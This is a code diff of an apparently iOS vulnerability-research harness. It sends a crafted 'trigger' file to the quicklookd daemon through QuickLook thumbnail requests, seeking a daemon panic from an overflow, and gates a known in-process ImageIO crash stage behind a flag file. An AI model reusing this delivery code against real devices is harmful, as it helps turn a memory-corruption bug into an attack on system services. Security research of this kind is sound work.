@@ -34,7 +34,7 @@
 #import <unistd.h>
 #import <mach/mach.h>
 
-#define P131_BUILD @"p131-ql-detour-v1"
+#define P131_BUILD @"p131-ql-detour-v2"
 
 static NSMutableString *g_buf;
 static int g_fd = -1;
@@ -90,7 +90,11 @@ static NSString *p131_ql_thumb(NSURL *url, NSMutableString *out) {
                                                            size:CGSizeMake(512, 512)
                                                           scale:3.0
                                               representationTypes:
-         QLThumbnailGenerationRequestRepresentationTypeLowQualityThumbnail];
+         QLThumbnailGenerationRequestRepresentationTypeAll];
+    /* v2: the v1 error-2 on BOTH files = access/provider refusal. Set the
+       content type explicitly (the file is a .pdf in our container — the
+       derived type may fail) and All representations. */
+    qreq.contentType = [UTType typeWithMIMEType:@"application/pdf"];
     [[QLThumbnailGenerator sharedGenerator]
         generateBestRepresentationForRequest:qreq
                            completionHandler:^(QLThumbnailRepresentation *rep,
@@ -150,7 +154,20 @@ static NSString *p131_ql_thumb(NSURL *url, NSMutableString *out) {
     Lf(@"  in-process CGPDFDocument: %@",
        bdoc && CGPDFDocumentGetNumberOfPages(bdoc) >= 1 ? @"parsed OK" : @"PARSE FAIL");
     if (bdoc) CFRelease(bdoc);
-    Lf(@"  QL thumbnail: %@", p131_ql_thumb(benign, g_buf));
+    NSString *b1 = p131_ql_thumb(benign, g_buf);
+    Lf(@"  QL thumbnail (Documents): %@", b1);
+    if ([b1 hasPrefix:@"ERROR"]) {
+        /* v2: retry from NSTemporaryDirectory — provider access may
+           differ per location */
+        NSURL *tmpb = [NSURL fileURLWithPath:
+                       [NSTemporaryDirectory() stringByAppendingPathComponent:
+                        @"p131_benign_tmp.pdf"]];
+        NSData *bd = [NSData dataWithContentsOfURL:benign];
+        [bd writeToURL:tmpb atomically:YES];
+        NSString *b2 = p131_ql_thumb(tmpb, g_buf);
+        Lf(@"  QL thumbnail (tmp dir): %@", b2);
+        [NSFileManager.defaultManager removeItemAtURL:tmpb error:nil];
+    }
 
     /* ---- stage 2: TRIGGER via the QL detour (daemon handoff) ---- */
     L(@"=== STAGE 2 TRIGGER-QL (quicklookd delivery of the trigger) ===");
@@ -161,17 +178,32 @@ static NSString *p131_ql_thumb(NSURL *url, NSMutableString *out) {
     L(@"   path p076 already collects. If we survived AND a quicklookd panic");
     L(@"   appears in crash logs within minutes = THE DAEMON RECEIPT.]");
 
-    /* ---- stage 3: our-process control so the difference is attributable */
-    L(@"=== STAGE 3 ImageIO in-process control (p076 replica, bounded) ===");
-    CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)trigger, NULL);
-    if (src) {
-        CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, NULL);
-        Lf(@"  ImageIO thumbnail: %@", img ? @"rendered OK in-process (did NOT "
-           @"hit the overflow this boot)" : @"FAILED/aborted in-process");
-        if (img) CFRelease(img);
-        CFRelease(src);
+    /* ---- stage 3: our-process control — FLAG-GATED (v2) ----
+       The v1 boot DIED HERE (ImageIO over the trigger = the 86950
+       in-process receipt). Stage 3 runs ONLY when
+       Documents/p131_stage3.txt exists: the QL stage gets its own tap
+       (one tap per force-quit law), the killer stage is a deliberate
+       second tap. */
+    L(@"=== STAGE 3 ImageIO in-process control (p076 replica, FLAG-GATED) ===");
+    BOOL wantS3 = [[NSFileManager defaultManager] fileExistsAtPath:
+                   [docs stringByAppendingPathComponent:@"p131_stage3.txt"]];
+    if (!wantS3) {
+        L(@"  SKIPPED (Documents/p131_stage3.txt absent) — deliberate tap 2 "
+          @"creates the flag to run the known in-process killer stage.");
     } else {
-        L(@"  ImageIO source: FAILED to open");
+        L(@"[flag present] running the killer stage — expected in-process "
+          @"86950 receipt class (v1 died here).");
+        CGImageSourceRef src = CGImageSourceCreateWithURL(
+            (__bridge CFURLRef)trigger, NULL);
+        if (src) {
+            CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, NULL);
+            Lf(@"  ImageIO thumbnail: %@", img ? @"rendered OK in-process (did NOT "
+               @"hit the overflow this boot)" : @"FAILED/aborted in-process");
+            if (img) CFRelease(img);
+            CFRelease(src);
+        } else {
+            L(@"  ImageIO source: FAILED to open");
+        }
     }
 
     L(@"=== VERDICT (honest) ===");
